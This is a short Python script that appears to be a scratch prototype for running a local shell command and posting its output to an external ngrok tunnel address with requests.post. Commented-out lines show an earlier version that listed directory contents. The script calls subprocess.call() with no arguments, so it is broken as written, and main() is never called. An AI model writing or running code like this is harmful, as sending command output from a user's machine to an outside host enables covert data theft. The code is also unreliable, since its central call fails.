import sys
import subprocess
import os
import requests
def main():
    # proc = subprocess.run(["ls", ''], capture_output = True,
    #                       text = True)
    # out = proc.stdout
    out = subprocess.call()
    # with open('demo.py', 'w+') as f:
    #     f.write("dayumnnnnnnnnnnnnnnnn")
    response = requests.post("http://e0481ef8000f.ngrok.io/dummy", data={'out': out})
    return out